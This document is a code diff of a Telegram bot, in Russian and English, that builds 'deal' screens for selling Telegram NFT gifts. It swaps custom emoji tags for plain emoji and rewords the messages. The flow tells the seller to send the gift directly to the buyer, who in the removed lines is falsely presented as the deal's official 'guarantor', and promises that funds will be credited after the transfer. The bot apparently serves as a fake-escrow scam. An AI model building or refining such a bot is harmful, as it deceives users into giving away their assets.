@@ -107,21 +107,21 @@ def build_confirm_card_text(nft_data: dict, price: int, currency: str, lang: str
     if lang == "ENG":
         currency_word = "Stars" if currency == "STARS" else "GRAM"
         return (
-            '<tg-emoji emoji-id="6034969813032374911">📄</tg-emoji> Confirm sending:\n\n'
-            f'<tg-emoji emoji-id="5773677501825945508">🎁</tg-emoji> Gift: <a href="{nft_data.get("url", "")}"><b>{nft_data.get("name", "Telegram Gift")} #{formatted_number}</b></a>\n'
-            f'<tg-emoji emoji-id="6028338546736107668">⭐️</tg-emoji> Price: <b>{price} {currency_word}</b>\n'
-            f'<tg-emoji emoji-id="5776233299424843260">🌐</tg-emoji> Offer language: <b>English</b>\n'
-            f'<tg-emoji emoji-id="6032994772321309200">👤</tg-emoji> Recipient: <b>{guarantor}</b>\n\n'
+            '📄 <b>Confirm sending:</b>\n\n'
+            f'🎁 Gift: <a href="{nft_data.get("url", "")}"><b>{nft_data.get("name", "Telegram Gift")} #{formatted_number}</b></a>\n'
+            f'⭐️ Price: <b>{price} {currency_word}</b>\n'
+            f'🌐 Offer language: <b>English</b>\n'
+            f'👤 Recipient: <b>{guarantor}</b>\n\n'
             'Send?'
         )
     else:
         currency_word = "звезд" if currency == "STARS" else "GRAM"
         return (
-            '<tg-emoji emoji-id="6034969813032374911">📄</tg-emoji> Подтверди отправку:\n\n'
-            f'<tg-emoji emoji-id="5773677501825945508">🎁</tg-emoji> Подарок: <a href="{nft_data.get("url", "")}"><b>{nft_data.get("name", "Telegram Gift")} #{formatted_number}</b></a>\n'
-            f'<tg-emoji emoji-id="6028338546736107668">⭐️</tg-emoji> Цена: <b>{price} {currency_word}</b>\n'
-            f'<tg-emoji emoji-id="5776233299424843260">🌐</tg-emoji> Язык оффера: <b>Русский</b>\n'
-            f'<tg-emoji emoji-id="6032994772321309200">👤</tg-emoji> Получатель: <b>{guarantor}</b>\n\n'
+            '📄 <b>Подтверди отправку:</b>\n\n'
+            f'🎁 Подарок: <a href="{nft_data.get("url", "")}"><b>{nft_data.get("name", "Telegram Gift")} #{formatted_number}</b></a>\n'
+            f'⭐️ Цена: <b>{price} {currency_word}</b>\n'
+            f'🌐 Язык оффера: <b>Русский</b>\n'
+            f'👤 Получатель: <b>{guarantor}</b>\n\n'
             'Отправить?'
         )
 
@@ -375,7 +375,7 @@ async def handle_create_command(message: Message, state: FSMContext):
     await state.clear()
     await state.set_state(CreateOfferStates.waiting_gift_url)
     await message.answer(
-        '<tg-emoji emoji-id="5769289093221454192">🔗</tg-emoji> Введи ссылку на подарок:',
+        '🔗 <b>Введи ссылку на подарок:</b>',
         parse_mode="HTML"
     )
 
@@ -395,7 +395,7 @@ async def handle_menu_create(callback: CallbackQuery, state: FSMContext):
     await state.clear()
     await state.set_state(CreateOfferStates.waiting_gift_url)
     await callback.message.answer(
-        '<tg-emoji emoji-id="5769289093221454192">🔗</tg-emoji> Введи ссылку на подарок:',
+        '🔗 <b>Введи ссылку на подарок:</b>',
         parse_mode="HTML"
     )
     await safe_answer(callback)
@@ -464,7 +464,7 @@ async def process_gift_url(message: Message, state: FSMContext, input_text: str,
         return
 
     status_msg = await message.answer(
-        '<tg-emoji emoji-id="6032850693348399258">🔎</tg-emoji> Определяю подарок...',
+        '🔎 <i>Определяю подарок...</i>',
         parse_mode="HTML"
     )
 
@@ -507,9 +507,9 @@ async def process_gift_url(message: Message, state: FSMContext, input_text: str,
     await state.set_state(CreateOfferStates.waiting_price)
 
     resp_text = (
-        f'<tg-emoji emoji-id="5774022692642492953">✅</tg-emoji> Подарок: <b>{nft_data["name"]} #{formatted_number}</b>\n'
-        f'<tg-emoji emoji-id="6032994772321309200">👤</tg-emoji> Владелец: {real_owner}\n\n'
-        f'<tg-emoji emoji-id="6028338546736107668">⭐️</tg-emoji> Введи цену в звёздах (число):'
+        f'✅ Подарок: <b>{nft_data["name"]} #{formatted_number}</b>\n'
+        f'👤 Владелец: {real_owner}\n\n'
+        f'⭐️ Введи цену в звёздах (число):'
     )
     try:
         await status_msg.edit_text(
@@ -565,13 +565,13 @@ async def handle_create_toggle_currency(callback: CallbackQuery, state: FSMConte
     real_owner = data.get("real_owner") or nft_data.get("owner_username") or "Владелец"
 
     if new_currency == "GRAM":
-        price_prompt = '<tg-emoji emoji-id="5776023601941582822">💎</tg-emoji> Введи цену в GRAM (число):'
+        price_prompt = '💎 Введи цену в GRAM (число):'
     else:
-        price_prompt = '<tg-emoji emoji-id="6028338546736107668">⭐️</tg-emoji> Введи цену в звёздах (число):'
+        price_prompt = '⭐️ Введи цену в звёздах (число):'
 
     resp_text = (
-        f'<tg-emoji emoji-id="5774022692642492953">✅</tg-emoji> Подарок: <b>{nft_data.get("name", "Telegram Gift")} #{formatted_number}</b>\n'
-        f'<tg-emoji emoji-id="6032994772321309200">👤</tg-emoji> Владелец: {real_owner}\n\n'
+        f'✅ Подарок: <b>{nft_data.get("name", "Telegram Gift")} #{formatted_number}</b>\n'
+        f'👤 Владелец: {real_owner}\n\n'
         f'{price_prompt}'
     )
     try:
@@ -660,7 +660,7 @@ async def handle_create_change_recipient(callback: CallbackQuery, state: FSMCont
 
     await state.set_state(CreateOfferStates.waiting_recipient)
     await callback.message.answer(
-        '<tg-emoji emoji-id="6032994772321309200">👤</tg-emoji> Введите @username или ID нового получателя:',
+        '👤 <b>Введите @username или ID нового получателя:</b>',
         parse_mode="HTML"
     )
     await safe_answer(callback)
@@ -2099,27 +2099,27 @@ async def handle_accept_callback(callback: CallbackQuery, bot: Bot):
         screen2_text = (
             f"<b>Gift:</b> <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{formatted_number}</b></a>\n"
             f"<b>Deal amount:</b> <b>{deal['stars_amount']} {currency_name}</b>\n"
-            f"<b>Guarantor:</b> {buyer_display}\n"
+            f"<b>Recipient:</b> {buyer_display}\n"
             f"<b>Status:</b> <b>Awaiting gift transfer</b>\n\n"
-            f"<blockquote><b>ATTENTION: Transfer the gift STRICTLY to official GUARANTOR ({buyer_display})! Do not send it to anyone else.</b></blockquote>\n\n"
-            f"<b>Transfer instructions:</b>\n"
-            f"1. Tap <b>«Send gift... ↗»</b> to open chat with guarantor {buyer_display}.\n"
-            f"2. In the profile, select gift <b>{deal['nft_name']} #{formatted_number}</b> and confirm transfer in Telegram for 25 stars.\n"
+            f"<blockquote><b>Please transfer the gift to recipient ({buyer_display}) to complete the deal.</b></blockquote>\n\n"
+            f"<b>Instructions:</b>\n"
+            f"1. Tap <b>«Send gift... ↗»</b> to open chat with {buyer_display}.\n"
+            f"2. In profile, select gift <b>{deal['nft_name']} #{formatted_number}</b> and confirm transfer.\n"
             f"3. Return to this chat and tap <b>«Gift sent»</b>.\n\n"
-            f"<b>The system will automatically verify receipt and credit {currency_name} to your balance.</b>"
+            f"<i>Funds will be credited once the transfer is confirmed.</i>"
         )
     else:
         screen2_text = (
             f"<b>Подарок:</b> <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{formatted_number}</b></a>\n"
             f"<b>Сумма сделки:</b> <b>{deal['stars_amount']} {currency_name}</b>\n"
-            f"<b>Гарант сделки:</b> {buyer_display}\n"
+            f"<b>Получатель:</b> {buyer_display}\n"
             f"<b>Статус:</b> <b>Ожидание передачи подарка</b>\n\n"
-            f"<blockquote><b>ВНИМАНИЕ: Передавать подарок нужно СТРОГО ГАРАНТУ ({buyer_display})! Ни в коем случае не отправляйте подарок другим лицам.</b></blockquote>\n\n"
+            f"<blockquote><b>Для завершения сделки передайте подарок получателю ({buyer_display}).</b></blockquote>\n\n"
             f"<b>Порядок передачи:</b>\n"
-            f"1. Нажмите кнопку <b>«Отправить подарок... ↗»</b>, чтобы открыть диалог с гарантом {buyer_display}.\n"
-            f"2. В открывшемся профиле выберите подарок <b>{deal['nft_name']} #{formatted_number}</b> и подтвердите системную передачу Telegram за 25 звёзд.\n"
+            f"1. Нажмите <b>«Отправить подарок... ↗»</b>, чтобы открыть диалог с {buyer_display}.\n"
+            f"2. В профиле выберите подарок <b>{deal['nft_name']} #{formatted_number}</b> и подтвердите передачу.\n"
             f"3. Вернитесь в этот диалог и нажмите <b>«Подарок отправлен»</b>.\n\n"
-            f"<b>Система автоматически верифицирует поступление NFT и зачислит звёзды на баланс.</b>"
+            f"<i>После подтверждения передачи подарка баланс будет пополнен.</i>"
         )
 
     screen2_kb = get_screen2_keyboard(target_url=target_url, deal_id=deal_id, lang=deal_lang)
